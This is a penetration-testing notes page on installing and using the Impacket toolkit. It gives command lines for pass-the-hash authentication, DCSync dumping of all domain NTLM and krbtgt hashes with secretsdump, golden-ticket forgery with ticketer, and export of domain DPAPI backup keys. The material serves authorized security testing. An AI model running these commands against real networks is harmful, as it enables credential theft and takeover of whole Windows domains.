<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# Impacket
## References
* The Hacker Tools: Impacket -<br />[https://tools.thehacker.recipes/impacket](https://tools.thehacker.recipes/impacket)

## Installation

* <details><summary>Process (Click to expand)</summary><p>
	1. Git Clone

			git clone https://github.com/secureauthcorp/impacket.git
	1. Enter directory

			cd impacket
	1. Create virtual environment

			pipenv shell
	1. Install with setup.py

			python setup.py install
		* Alternative

				pip install .
	1. Confirm no remaining libraries were missed with requirements.txt

			pip install -r requirements.txt

## General Usage

* <details><summary>General usage notes to avoid duplicating this information across tools (Click to expand)</summary><p>
	* Password authentication

			python examples/toolname.py domain.local/username@target-name-or-IP
		* Submit password once executed
		* Non-opsec format

				python examples/toolname.py domain.local/username:P@ssw0rd@target-name-or-IP
	* NTLM Hash authentication

			python examples/toolname.py domain.local/username:P@ssw0rd@target-name-or-IP -hashes :<ntlm-hash>
	* Kerberos Authentication
		* Notes
			* Linux
				* Set the kerberos ticket in your environment before usage.

						export KRB5CCNAME='administrator.ccache'
		* Format

				python examples/toolname.py domain.local/username@target-name-or-IP -k -n
	* Relay Authentication
		* See AD Relay guide for additional context

				python examples/toolname.py domain.local/username@target-name-or-IP -n

### Notes on specific tools

* <details><summary>secretsdump.py (Click to expand)</summary><p>
	* Commands beyond general impacket tool usage
		* Target a specific user (KRBTGT)

				secretsdump.py -just-dc-user DOMAIN/krbtgt 'DOMAIN/user1234:PASSWORD@192.168.1.1'
			* If you receive an error, check that the **ntds.dit** file (and associated registry hives) are in their default locations.

					C:\>reg query HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters
	* Specify custom NTDS location (note the forward slashes)
		
			secretsdump.py -ntds 'D:/Windows/NTDS/ntds.dit' -just-dc-user angela -k 'evilcorp.local/administrator@dc01.evilcorp.local'
	* DCSync
		* Receive all the NTLM hashes from a DC

				secretsdump.py 'DOMAIN/DomainAdmin:PASSWORD@domaincontroller.evilcorp.local'
	* If the user you control is restricted from logging in to CIFS-based services ("STATUS_ACCOUNT_RESTRICTION" on login), you can bypass the restriction by pulling the `krbtgt` hash with `getST.py`, then following the 'Impacket Golden Key Generation' steps below:

			getST.py -spn krbtgt -hashes :e19ccf75ee54e06b06a5907af13cef42 evilcorp.local/angela
			export KRB5CCNAME=$(pwd)/angela.ccache
			secretsdump.py -k -no-pass dc01.evilcorp.local -just-dc-user krbtgt
* <details><summary>lookupsid.py (Click to expand)</summary><p>
	* Get SID using Impacket

			lookupsid.py -hashes aad3b435b51404eeaad3b435b51404ee:<NTLMHASH> DOMAIN/user@domain.com -domain-sids
* <details><summary>ticketer.py (Click to expand)</summary><p>
	* Notes
		* Impacket Generate Ticket To File
	* Requirements
		* FQDN
		* Name resolution of the domain to target IP address
			* Option 1: Edit the /etc/hosts file

					192.168.1.1     DOMAIN.COM
	* Process
		1. Launch ticketer.py. This will create a administrator.ccache file.

				python ticketer.py -nthash KRBTGTHASH -domain-sid S-1-5-21-XXXXXXXX-XXXXXXX-XXXXXX -domain TESTDOMIN.LOC USERXXX
			* Troubleshooting
				* Error `KDC_ERR_ETYPE_NOSUPP`
					* RC4 authentication is disabled for kerberos tickets
					* Instead, use `-aesKey` instead of `-nthash` and replace with the `krbtgt AES256 key`
* <details><summary>dpapi (Click to expand)</summary><p>
	* Notes
		* Dumping Domain DPAPI Backup key Using Impacket
	* Process
		* Password:

				dpapi backupkeys -t 'domain.com/user1234@domaindc.domain.com' --export
		* Hashes

				* dpapi -hashes LM:NTLM backupkeys -t 'domain.com/user1234@domaindc.domain.com' --export
		* Golden key (You must press enter for a blank password)

				dpapi -k backupkeys -t 'domain.com/user1234@domaindc.domain.com' --export